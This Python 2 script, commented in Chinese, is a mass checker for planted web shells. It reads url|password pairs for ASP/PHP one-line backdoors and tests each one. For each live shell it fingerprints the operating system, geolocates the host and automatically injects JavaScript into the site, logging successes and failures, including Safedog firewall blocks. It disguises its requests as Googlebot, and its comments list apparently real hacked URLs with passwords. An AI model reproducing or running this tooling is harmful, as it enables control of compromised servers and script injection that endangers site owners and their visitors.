#!/usr/local/bin/python
#-*- coding: UTF-8 -*-
import threading
import Queue
import time
import urllib2
import urllib
import qqwry  #网址返回  IP和物理地址
import sys
url_root1 = Queue.Queue()

import re,httplib
import gzip,StringIO
import socket
socket.setdefaulttimeout(10)

import sys
reload(sys)
sys.setdefaultencoding('utf-8')
import eval_php  #一句话相关操作
import qqwry  #IP纯真数据库
##############################################################################################
def add_Queue():  #添加到消息队列
    try:
        list=[]
        list_2=[]
        xxx = file(TXT_file, 'r')
        for xxx_line in xxx.readlines():  #读取数据
            #如果输入的内容读取有回车符号，可以用strip来消除，可得到完美的输出
            data=xxx_line.strip()
            list.append(data)  #添加数据

        for i in list:  #去重重复数据
            if i not in list_2:
                list_2.append(i)

        for i in list_2:  #添加到数组
            ss = i.split("|")
            if len(ss)>=2:
                if not "http" in ss[0]:
                    print u"请带上 http://-----%s"%(ss[0])
                    continue  #跳过
                lis_yjh=ss[0],ss[1]
                #print lis_yjh
                url_root1.put(lis_yjh,0.3)   #插入队列

        global yijuhuaZS
        yijuhuaZS=url_root1.qsize()
        print u"共带入%s条一句话数据"%(url_root1.qsize())
    except Exception,e:
        print u"添加到消息队列   错误",e
        return 0
###################################
class C_Queue(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)
        self.yjH=eval_php.C_YJH()

    def TXT_file(self,file_nem,data):  #写入文本
        try:
            #file_nem=time.strftime('%Y.%m.%d')   #file_nem+".txt"
            file_object = open(file_nem,'a')
            #file_object.write(list_passwed[E])
            file_object.writelines(data)
            file_object.writelines("\n")
            file_object.close()
        except Exception,e:
            print u"写入TXT失败",file_nem,e
            return 0

    def TXT_file2(self,file_nem,data):  #写入文本 中文
        try:
            #file_nem=time.strftime('%Y.%m.%d')   #file_nem+".txt"
            file_object = open(file_nem,'a')
            file_object.write(data.encode("utf-8")) #成功
            file_object.writelines("\n")
            file_object.close()
        except Exception,e:
            print u"写入TXT失败",file_nem,data,e
            return 0

    def open_url_data(self,url):  #读取网页内容
        try:
            return urllib.urlopen(url).read()
        except:
            return 0

    def url_post(self,URL):  #提交内容
        try:
            req = urllib2.Request(URL)
            req.add_header('User-Agent',"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)")
            urllib2.urlopen(req,timeout=20)  # 超时10秒   #s = urllib2.urlopen(r"http://www.163.com")
            #urllib2.urlopen(URL,timeout=20)  # 后门POST提交   超时10秒   #s = urllib2.urlopen(r"http://www.163.com")
            time.sleep(1)
            return 1
        except:
            return 0

    def URL_TQURL(self,data): #URL提取URL
        try:
            sStr="null"
            data +="/"      #data ="https://www.baidu.com/cache/sethelp/index.html"
            if ~data.find("http://"):  #~取反
                data=data[7:] #字符串删除
                nPos = data.index('/') #查找字符        #print nPos
                sStr1 = data[0:nPos] #复制指定长度的字符
                sStr=sStr1

            if ~data.find("https://"):  #~取反
                data=data[8:] #字符串删除
                nPos = data.index('/') #查找字符
                #print nPos
                sStr1 = data[0:nPos] #复制指定长度的字符
                sStr=sStr1


            sStr=sStr.replace("/","_")
            sStr=sStr.replace(":","_")
            return sStr
        except:
            #print "Thread:%d-CS_openurl-Extract URL:%s URL error"%\
            #      (self.Ht,data)
            return "www null"

    def run(self):
        try:
            while True:
                if url_root1.empty():   #判断队列是否为空
                    print u"已经没有可操作的一句话了"
                    time.sleep(30)
                    self.run()

                self.URL = url_root1.get(0.5)  #get()方法从队头删除并返回一个项目
                ASP_PHP=""
                #                url="http://www.sttc.cn/uploadfile/2013/0621/thumb_6_6_.Php.JPG%20%20%20%20%20%20%20Php"
                #                PASS="long"
                if (".asp" in self.URL[0] or ".ASP" in self.URL[0] or ".Asp" in self.URL[0]):
                    ASP_PHP="asp"
                if (".php" in self.URL[0] or ".PHP" in self.URL[0] or ".Php" in self.URL[0]):
                    ASP_PHP="php"

                if self.yjH.yijuhua_cs(ASP_PHP,self.URL[0],self.URL[1]): #ASP还是PHP  ,URL地址 ，密码
                    LIN_WIN32=self.yjH.yijuhua_win_linux(self.URL[0],self.URL[1])   #返回操作系统
                    h=qqwry.C_hoset()
                    WLWZ=h.www_data(qqwry.url_www(self.URL[0]))  #返回物理位置

                    file_data=self.yjH.yijuhua_php_js(self.URL[0],self.URL[1]) #URL地址 ，密码   自动挂载JS

                    name="web_log/%s.html"%(self.URL_TQURL(self.URL[0]))
                    #print name
                    self.TXT_file(name,str(file_data))
                    data=self.URL[0]+"|"+self.URL[1]+"|"+LIN_WIN32+"|"+WLWZ
                    self.TXT_file("OK.txt",str(data))
                    print u"OK连接成功-----",data
                else:
                    data=self.URL[0]+"|"+self.URL[1]
                    ss=self.open_url_data(self.URL[0])
                    #print self.URL[0],"1111111",ss
                    if ss==0:  #读取网页内容
                        data+=u"|文件丢失"
                        self.TXT_file("NO.txt",str(data))
                        print u"NO.txt文件不存在-----",data
                        #self.NO+=1
                        time.sleep(1)
                    else:  #www.safedog.cn
                        #if "www.safedog.cn" is ss:
                        pname = re.compile("www.safedog.cn")
                        sarr = pname.findall(ss)
                        if sarr:
                            data+=u"|被安全狗拦截"
                            self.TXT_file("NO.txt",str(data))
                            print u"NO.txt被安全狗拦截-----",data
                            #self.NO+=1
                            time.sleep(1)
                        else:
                            data+=u"|密码错误"
                            self.TXT_file("NO.txt",str(data))
                            print u"NO.txt密码错误-----",data
                            #self.NO+=1
                            time.sleep(1)
                #print u"一句话总数%s条---成功%d条---失败%d条---还剩%d条需要测试"%(yijuhuaZS,self.OK,self.NO,yijuhuaZS-(self.OK+self.NO))
        except Exception,e:
            print u"错误!!!!!!!!!!",e
            time.sleep(10)
            self.run()
##############################################################################################

if __name__ == "__main__":
    print u"一句话 测试  \r\n"
    global TXT_file #导入文本
    TXT_file = None
    #TXT_file ="1.txt"
    if len(sys.argv) < 2:
        print u"无参数传入   \r\n软件使用bat方法   main.exe 1.txt"
        print u"无参数传入   \r\n软件使用批处理或者cmd带参数传入   软件名 要扫描的内容"
        print u"扫描内容一行一条\r\n 格式如下   http://xxxx.com/Style.php|cmd"
        time.sleep(300)
    TXT_file=sys.argv[1]

    add_Queue()  #添加到消息队列

    threads = []  #线程
    for i in range(1):  #nthreads=10  创建10个线程
        threads.append(C_Queue())
    for t in threads:   #不理解这是什么意思    是结束线程吗
        t.start()  #start就是开始线程


#    yjH=eval_php.C_YJH()
#    #print yjH.yijuhua_cs("php","http://127.0.0.1:8888/long.php","long") #ASP还是PHP  ,URL地址 ，密码
#    print yjH.yijuhua_php_js("http://www.hjjc028.com/plus/mytag_js.php?aid=9090","guige") #URL地址 ，密码   自动挂载JS